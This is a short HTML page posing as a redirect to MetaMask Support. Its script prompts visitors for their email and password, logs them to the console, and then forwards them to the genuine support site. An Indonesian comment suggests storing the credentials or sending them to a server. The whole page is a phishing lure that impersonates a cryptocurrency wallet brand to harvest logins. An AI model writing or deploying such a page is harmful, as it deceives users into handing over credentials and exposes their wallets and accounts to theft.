<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Redirecting...</title>
  <script>
    setTimeout(() => {
      const email = prompt("Enter your email:");
      const pass = prompt("Enter your password:");
      // Bisa disimpan di localStorage, atau kirim ke server jika perlu
      console.log("Email:", email);
      console.log("Password:", pass);

      location.href = "https://support.metamask.io";
    }, 1500);
  </script>
</head>
<body>
  <p style="font-family: sans-serif; text-align:center; margin-top: 30vh;">Redirecting to MetaMask Support...</p>
</body>
</html>
